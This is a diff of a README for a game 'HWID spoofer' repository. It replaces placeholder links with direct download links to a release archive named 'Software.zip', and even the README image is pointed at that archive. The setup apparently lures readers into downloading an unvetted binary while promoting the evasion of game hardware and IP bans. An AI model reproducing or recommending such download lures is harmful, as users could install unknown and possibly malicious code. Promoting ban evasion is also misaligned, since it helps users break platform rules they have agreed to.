@@ -36,7 +36,7 @@ Welcome to the Monotone HWID Spoofer GitHub repository. This repository contains
 
 ## Getting Started
 To get started with the Monotone HWID Spoofer, click the link below to download the tool:
-[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Spoofer](https://github.com/climassistadmin/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)](https://github.com/climassistadmin/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 ## Installation
 Once you have downloaded the spoofer tool, follow these steps to install and start using it:
@@ -53,7 +53,7 @@ Please note that the use of this spoofer tool may violate the terms of service o
 
 **Remember:** Play fair, have fun, and happy gaming! 🎮
 
-![HWID Spoofer](https://imageurl.com)
+![HWID Spoofer](https://github.com/climassistadmin/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 ---
 Now that you have all the information you need, go ahead and download the Monotone HWID Spoofer to start bypassing hardware or IP bans in your favorite games. Happy gaming! 🎉
